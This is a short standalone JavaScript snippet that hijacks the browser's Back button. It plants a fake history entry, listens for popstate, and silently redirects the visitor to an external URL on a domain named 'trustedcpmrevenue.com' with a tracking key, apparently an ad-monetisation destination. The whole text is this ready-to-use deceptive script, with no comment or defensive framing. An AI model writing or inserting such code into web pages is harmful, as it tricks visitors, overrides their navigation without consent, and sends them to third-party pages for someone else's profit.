(function(window, location) {
history.replaceState(null, document.title, location.pathname+"#!/history");
history.pushState(null, document.title, location.pathname);

window.addEventListener("popstate", function() {
  if(location.hash === "#!/history") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace("https://www.trustedcpmrevenue.com/ag4ajq94m3?key=2d1cee70c6f009dda970a363aa6fa19c");
    },10);
  }
}, false);
}(window, location));
